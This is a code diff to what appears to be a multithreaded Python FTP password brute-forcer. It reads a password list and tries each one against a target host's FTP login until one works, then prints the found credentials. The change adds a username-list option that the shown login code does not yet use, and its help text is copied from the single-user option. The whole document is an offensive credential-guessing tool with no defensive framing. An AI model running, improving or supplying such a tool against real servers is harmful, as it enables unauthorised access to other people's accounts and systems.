@@ -10,6 +10,7 @@ parser.add_argument("-ho","--host",required=True, type=str, help="Enter the targ
 parser.add_argument("-p","--passfile",required=True,type=str,help="Enter the path of file containing password list")
 parser.add_argument("-t","--threads",default=20,type=int,help="enter the number of threads. Default : 20")
 parser.add_argument("-u","--user",required=True,type=str,help="enter the Username to connect to provided host")
+parser.add_argument("-U","--userfile",required=True,type=str,help="enter the Username to connect to provided host")
 
 args = parser.parse_args()
 
@@ -18,6 +19,7 @@ args = parser.parse_args()
 host = args.host
 user = args.user
 passfile = args.passfile
+userfile = args.userfile
 threads = args.threads if args.threads else 20
 
 
@@ -27,11 +29,17 @@ def passwd(passfile):
         return[line.strip('\n') for line in f]
 
 
-
-
-
-
 passwords = passwd(passfile)
+
+
+
+def load_usernames(userfile):
+    with open(userfile, 'r', encoding='utf-8') as f:
+        return [line.strip() for line in f]
+
+usernames = load_usernames(userfile)
+
+
 
 
 pass_queue = Queue()
@@ -61,7 +69,7 @@ def workers():
             with ftplib.FTP() as serve:
                 serve.connect(host,21,timeout=5)
                 serve.login(user,password)
-                print("||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
+                
                 print("===========================================================================\n")
                 print(" The Password was Found and Connection was Success\n")
                 print(f"Connect with {host} as {user}  :   {password}\n")
